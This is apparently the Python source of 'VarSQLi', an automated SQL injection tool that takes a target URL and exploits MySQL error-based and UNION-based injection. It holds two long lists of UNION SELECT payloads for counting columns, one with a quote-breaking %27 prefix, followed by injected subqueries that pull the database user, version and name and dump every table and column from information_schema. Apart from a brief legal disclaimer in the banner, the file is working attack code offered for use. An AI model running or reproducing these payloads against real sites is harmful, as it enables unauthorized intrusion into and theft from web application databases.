import requests
import argparse
import time
import re
import os

def banner():
    print('''
              ___
 _____         H  _____     _ _  {1.1.5}
|  |  |___ ___[,]|   __|___| |_| 
|  |  | .'|  _[(]|__   | . | | | {Pham Chien}
 \___/|__,|_| [)]|_____|_  |_|_|
               V         |_|  ghostmanews.blogspot.com

               
[+] Remember, using VarSQLi or any similar tool for illegal activities can result in severe legal consequences, including imprisonment. It is crucial to prioritize ethical hacking practices, collaborate with security professionals, and comply with relevant laws and regulations to ensure responsible and lawful use of such tools.
''')
banner()
parser = argparse.ArgumentParser(description='VarSQLi - Auto SQL Injection tools') 
parser.add_argument('--url', dest='url', help='URL Target (ex : https://test.com/yourpath_vulnsqli.php?id=1)')

args = parser.parse_args()

target_url = args.url
if target_url:
    def check_url():
        payload_check_1 = '%27'
        payload_check_2 = '/**8**/UNION SELECT 1,2,3--+-'
        print("[INFO] Testing connect to target url..")
        check_conn = requests.get(target_url)
        if check_conn.status_code == 200:
            print("[INFO] Testing IF the target url content is stable")
            results_check_1 = requests.get(target_url + payload_check_1)
            if "at line" in results_check_1.text:
                print("[INFO] Target is the content stable..")
                time.sleep(1.3)
                print("[INFO] Testing 'Generic atline queries'..")
                check_queries = requests.get(target_url + payload_check_2)
                if 'The used SELECT' in check_queries.text:
                    print("[INFO] Testing 'UNION SELECT NUMBER COUNT COLUMNS (MySQL Select).'")
                    payloads = [
                       "+AND+0+UNION+SELECT+1,2--+-",
                       "+AND+0+UNION+SELECT+1,2,3--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49--+-",
                       "+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50--+-",
                    ]
                    count_num = 1
                    for payload in payloads:
                        count_num += 1
                        print("[INFO] Testing Payload '{}'".format(payload))
                        results = requests.get(target_url + payload)
                        if results.status_code == 200:
                            print("[INFO] Total Response Content HTML stable : 200 OK")
                            if "The used SELECT" and "The used SELECT statements have a different number of columns" in results.text:
                                pass
                            else:
                                print("[INFO] Found Columns - (Number Count) - {}".format(count_num))
                                print("-------")
                                print("Parameter : 1 (GET)")
                                print("")
                                print("     typer : booleand-based blind")
                                print("     title : AND booleand-based blind - WHERE or HEAVING count")
                                print("     Payload : +AND+1=1")
                                print("     URL target : {}".format(target_url))
                                print("     Columns Select : {}".format(count_num))
                                print("")
                                print("     typer : Enumerate Count Columns")
                                print("     title : UNION SELECT COUNT COLUMNS - (MySQL COUNT)")
                                print("     Payload : {}".format(payload))
                                print("     URL target : {}".format(target_url))
                                print("     Columns Select : {}".format(count_num))
                                print("-------")
                                time.sleep(1)
                                print("[INFO] The back-end DBMS is MySQLi")
                                payload_check_version_1 = "version()"
                                numss = count_num
                                nums = [numss for numss in range(2, numss+1)]
                                for num_countss in nums:
                                    payload_3 = "(SELECT+GROUP_CONCAT(database(),'::',version()))"
                                    get_dbs = re.sub(r"\b{}\b".format(num_countss), payload_3, payload)
                                    results_get_dbs = requests.get(target_url + get_dbs)
                                    html_cont = results_get_dbs.text
                                    databs = r"\b\w+::\b"
                                    dump_dbase = re.findall(databs, html_cont)
                                    payload_check_count = str(dump_dbase)
                                    results = requests.get(target_url + payload_check_count)
                                    if str(num_countss) and "::" in results.text:
                                        print("Columns Found : {}".format(num_countss))
                                        payloads_ver_1 = "version()"
                                        version_payload = re.sub(r"\b{}\b".format(num_countss), payloads_ver_1, payload)
                                        
                                        results_get_ver = requests.get(target_url + version_payload)
                                        print("back-end MySQL: ")
                                        if "ubuntu" in results_get_ver.text:
                                            print("web server operating system : Linux Ubuntu")
                                        if "cll-lve" in results_get_ver.text:
                                            print("web server operating system : Linux cll-lve")
                                        if "MariaDB" in results_get_ver.text:
                                            print("web server operating system : MariaDB")

                                        print("[INFO] Starting Enumerate table name DBMS...")
                                        payload_2 = "(SELECT+GROUP_CONCAT(user(),'::',version()))"
                                        get_user = re.sub(r"\b{}".format(num_countss), payload_2, payload)
                                        results_get_user = requests.get(target_url + get_user)
                                        html_cont = results_get_user.text
                                        userss = r"\b\w+@\b\w+::\b"
                                        dump_all = re.findall(userss, html_cont)
                                        for user in dump_all:
                                            print("operating Enumerate: ")
                                            print("web server operating user mysql :", user)
                                        payload_3 = "(SELECT+GROUP_CONCAT(database(),'::',version()))"
                                        get_dbs = re.sub(r"\b{}\b".format(num_countss), payload_3, payload)
                                        results_get_dbs = requests.get(target_url + get_dbs)
                                        html_cont = results_get_dbs.text
                                        databs = r"\b\w+::\b"
                                        dump_dbase = re.findall(databs, html_cont)
                                        for dbs in dump_dbase:
                                            print("web server operating Database 1 :", dbs)
                                            print("web server operating Database 2 : information_schema")
                                            print("--------")
                                        print("[INFO] Starting Enumerate DBMS table name...")
                                        payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',column_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.columns+WHERE+table_schema=database())"
                                        rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
                                        results_get_queries = requests.get(target_url + rm)
                                        html_cont = results_get_queries.text
                                        dbms = r"\b\w+::\b\w+::\b"
                                        database_all = re.findall(dbms, html_cont)
                                        print("Blind table name")
                                        print("Dump DBS : {}".format(dbs))
                                        print("------------------")
                                        print("| table | column |")
                                        print("------------------")
                                        for database in database_all:
                                            print("+", database)
                                        payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',column_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.columns)"
                                        rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
                                        results_get_queries = requests.get(target_url + rm)
                                        html_cont = results_get_queries.text
                                        dbms = r"\b\w+::\b\w+::\b"
                                        database_all = re.findall(dbms, html_cont)
                                        print("")
                                        print("Blind table name")
                                        print("Dump DBS : information_schema")
                                        print("------------------")
                                        print("| table | column |")
                                        print("------------------")
                                        for database in database_all:
                                            print("+", database)
                                        exit()
                                    else:
                                        print("Testing count")
                                    

# =============================================================================================================================
#                                       Payload %27 
                else:
                    print("[INFO] payload UNION basic not valid vulnerable...")
                    time.sleep(0.50)
                    print("[INFO] Starting Random Payload to check Target...")
                    time.sleep(1)
                    print("[INFO] Testing 'UNION SELECT NUMBER COUNT COLUMNS (MySQL Select).'")
                    payloads_1 = [
                       "%27+AND+0+UNION+SELECT+1,2--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49--+-",
                       "%27+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50--+-",
                    ]
                    count_num = 1
                    for payload in payloads_1:
                        count_num += 1
                        print("[INFO] Testing Payload '{}'".format(payload))
                        results = requests.get(target_url + payload)
                        if results.status_code == 200:
                            print("[INFO] Total Response Content HTML stable : 200 OK")
                            if "The used SELECT" and "The used SELECT statements have a different number of columns" in results.text:
                                print("[WARNING] Failed Injection Payload UP..")
                                pass
                            else:
                                print("[INFO] Found Columns - (Number Count) - {}".format(count_num))
                                print("-------")
                                print("Parameter : 1 (GET)")
                                print("")
                                print("     typer : booleand-based blind")
                                print("     title : AND booleand-based blind - WHERE or HEAVING count")
                                print("     Payload : +AND+1=1")
                                print("     URL target : {}".format(target_url))
                                print("     Columns Select : {}".format(count_num))
                                print("")
                                print("     typer : Enumerate Count Columns")
                                print("     title : UNION SELECT COUNT COLUMNS - (MySQL COUNT)")
                                print("     Payload : {}".format(payload))
                                print("     URL target : {}".format(target_url))
                                print("     Columns Select : {}".format(count_num))
                                print("-------")
                                time.sleep(1)
                                print("[INFO] The back-end DBMS is MySQLi")
                                numss = count_num
                                nums = [numss for numss in range(3, numss+1)]
                                for num_countss in nums:
                                    payload_3 = "(SELECT+GROUP_CONCAT(database(),'::',version()))"
                                    get_dbs = re.sub(r"\b{}\b".format(num_countss), payload_3, payload)
                                    results_get_dbs = requests.get(target_url + get_dbs)
                                    html_cont = results_get_dbs.text
                                    databs = r"\b\w+::\b"
                                    dump_dbase = re.findall(databs, html_cont)
                                    payload_check_count = str(dump_dbase)
                                    results = requests.get(target_url + payload_check_count)
                                    if str(num_countss) and "::" in results.text:
                                        print("Columns Found : {}".format(num_countss))
                                        payloads_ver_1 = "version()"
                                        version_payload = re.sub(r"\b{}\b".format(num_countss), payloads_ver_1, payload)
                                        
                                        results_get_ver = requests.get(target_url + version_payload)
                                        print("back-end MySQL: ")
                                        if "ubuntu" in results_get_ver.text:
                                            print("web server operating system : Linux Ubuntu")
                                        if "cll-lve" in results_get_ver.text:
                                            print("web server operating system : Linux cll-lve")
                                        if "MariaDB" in results_get_ver.text:
                                            print("web server operating system : MariaDB")

                                        print("[INFO] Starting Enumerate table name DBMS...")
                                        payload_2 = "(SELECT+GROUP_CONCAT(user(),'::',version()))"
                                        get_user = re.sub(r"\b{}".format(num_countss), payload_2, payload)
                                        results_get_user = requests.get(target_url + get_user)
                                        html_cont = results_get_user.text
                                        userss = r"\b\w+@\b\w+::\b"
                                        dump_all = re.findall(userss, html_cont)
                                        for user in dump_all:
                                            print("operating Enumerate: ")
                                            print("web server operating user mysql :", user)
                                        payload_3 = "(SELECT+GROUP_CONCAT(database(),'::',version()))"
                                        get_dbs = re.sub(r"\b{}\b".format(num_countss), payload_3, payload)
                                        results_get_dbs = requests.get(target_url + get_dbs)
                                        html_cont = results_get_dbs.text
                                        databs = r"\b\w+::\b"
                                        dump_dbase = re.findall(databs, html_cont)
                                        for dbs in dump_dbase:
                                            print("web server operating Database 1 :", dbs)
                                            print("web server operating Database 2 : information_schema")
                                            print("--------")
                                        print("[INFO] Starting Enumerate DBMS table name...")
                                        payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',column_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.columns+WHERE+table_schema=database())"
                                        rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
                                        results_get_queries = requests.get(target_url + rm)
                                        html_cont = results_get_queries.text
                                        dbms = r"\b\w+::\b\w+::\b"
                                        database_all = re.findall(dbms, html_cont)
                                        print("Blind table name")
                                        print("Dump DBS : {}".format(dbs))
                                        print("------------------")
                                        print("| table | column |")
                                        print("------------------")
                                        for database in database_all:
                                            print("+", database)
                                        payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',column_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.columns)"
                                        rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
                                        results_get_queries = requests.get(target_url + rm)
                                        html_cont = results_get_queries.text
                                        dbms = r"\b\w+::\b\w+::\b"
                                        database_all = re.findall(dbms, html_cont)
                                        print("")
                                        print("Blind table name")
                                        print("Dump DBS : information_schema")
                                        print("------------------")
                                        print("| table | column |")
                                        print("------------------")
                                        for database in database_all:
                                            print("+", database)
                                        exit()
                                    else:
                                        print("[INFO] Testing Count Columns Founds : {}".format(num_countss))
        
            else:
                print("[WARNING] Target Injection Failed (this on line)")
                exit()
        else:
            print("[WARNING] Target Not accept, response not found...")
            exit()

    check_url()
else:
    print("Usage : python3 varsqli.py --url < URL Vulnerablity >")
    print("Help : python3 varsqli.py --help for helping")
